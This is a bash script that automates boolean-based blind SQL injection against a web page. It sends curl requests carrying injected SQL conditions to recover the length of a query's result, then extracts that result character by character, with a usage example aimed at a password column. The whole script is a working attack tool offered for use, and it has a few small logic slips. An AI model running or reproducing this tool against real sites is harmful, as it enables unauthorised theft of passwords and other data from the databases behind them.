#!/bin/bash

#Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

length=""
commando="$2"
url=$1
string=$3

if [[ -z $url || -z $commando || -z $string ]];then
  echo -e "\n$yellowColour[!] Usage: $0 'http://vulnerable.site/sqli.php?id=1234' 'SELECT password FROM awd.accounts LIMIT 1' 'String which appears when TRUE condition'"
  exit 1
fi

function getChar(){

  if [[ "$2" == "l" ]];then
    begin=97
    end=122
  elif [[ "$2" == "u" ]];then
    begin=65
    end=90
  elif [[ $2 -eq 33 ]];then
    begin=33
    end=64
  elif [[ $2 -eq 91 ]];then
    begin=91
    end=96
  elif [[ $2 -eq 123 ]];then
    begin=123
    end=126
  fi

  for c in $(seq $begin $end 2>/dev/null); do
    charHex="$(printf '%x' $c)"
    char="$(echo $charHex | xxd -ps -r)"
    #echo -e "$blueColour[*] Testing if $commando[$1] = '$char'$endColour"
    res=$(curl -sik "$url%20or%20(SELECT%20substring((${commando// /%20}),$1,1))=%27%$charHex%27;%20--%20-" | grep -o "$string")
    if [[ ! -z "$res" ]];then
      #echo -e "$greenColour[+] $commando[$1] = $char$endColour"
      echo "$1 $char" >> $(pwd)/blindsqli.txt
      break
    fi
  done

}

echo -e "\n$blueColour[*] Getting length... "

for l in {1..255}; do
    #echo -e "$blueColour[*] Testing if $commando has $l characters...$endColour"
    res=$(curl -sik "$url%20or%20(SELECT%20CHAR_LENGTH((${commando// /%20})))=%27$l%27;%20--%20-" | grep -o "$string")
    if [[ ! -z "$res" ]];then length="$l"; break; fi
done
echo -e "\n$greenColour[+] String's lenght is: $endColour$length"

echo -e "\n$blueColour[*] Getting characters..."
echo -e "$blueColour[*] Don't worry if seems hanged, I'm working on it, you can go for a coffee :)"

for i in $(seq 1 $length); do
  resL=$(curl -sik "$url%20or%20(SELECT%20ascii(lower(substring((${commando// /%20}),$i,1))))=(SELECT%20ascii(substring((${commando// /%20}),$i,1)));%20--%20-" | grep -o "$string")
  resU=$(curl -sik "$url%20or%20(SELECT%20ascii(upper(substring((${commando// /%20}),$i,1))))=(SELECT%20ascii(substring((${commando// /%20}),$i,1)));%20--%20-" | grep -o "$string")
  if [[ ! -z "$resL" && -z $resU ]];then
    getChar "$i" "l" &
    continue
  elif [[ ! -z "$resU" && -z "$resL" ]];then 
    getChar "$i" "u" &
    continue
  else
    getChar "$i" "33" &
    if [[ ! -z ${exfiltrate[$i]} ]];then continue; fi

    getChar "$i" "91" &
    if [[ ! -z ${exfiltrate[$i]} ]];then continue; fi

    getChar "$i" "126" &
  fi
done

wait
exfiltrate=$(sort -g $(pwd)/blindsqli.txt | awk '{print $2}' | xargs | sed 's/ //g')
rm $(pwd)/blindsqli.txt
echo -e "\n$greenColour[+] Here's your exifltrated string: $endColour$exfiltrate"
